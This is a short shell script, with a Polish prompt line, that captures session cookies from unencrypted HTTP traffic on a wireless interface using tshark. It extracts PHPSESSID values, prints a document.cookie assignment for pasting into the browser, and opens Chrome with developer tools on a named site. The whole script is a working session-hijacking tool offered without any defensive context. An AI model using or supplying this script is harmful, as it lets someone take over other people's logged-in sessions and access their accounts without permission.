 #!/bin/sh

value=$(tshark -V -i wlan0 -Y http -a duration:10 | grep  "Set-Cookie: PHPSESSID=" | awk '{print $2}') &&  echo skopiuj ten link document.cookie=\"$value\"  && google-chrome  --auto-open-devtools-for-tabs mikolaj.ovh >/dev/null
